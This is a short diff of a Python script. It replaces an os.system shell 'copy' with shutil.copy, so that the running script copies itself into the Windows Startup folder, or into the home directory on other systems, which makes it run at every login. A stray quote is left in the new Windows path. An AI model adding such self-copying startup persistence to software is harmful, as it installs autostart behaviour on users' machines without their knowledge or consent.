@@ -2,11 +2,14 @@ import sys
 import os
 import psutil
 import traceback
+import shutil
 
-path ='copy '+ os.path.basename(sys.argv[0]) + ' ' + '"' + os.path.expandvars("%userprofile%")+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
+if sys.platform == "win32":
+    dest_path =  os.path.expandvars("%userprofile%")+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
+else:
+    dest_path = os.path.expanduser('~')
 
-os.system(path)
-
+shutil.copy(os.path.basename(sys.argv[0]),dest_path)
 
 def restart_program():
     
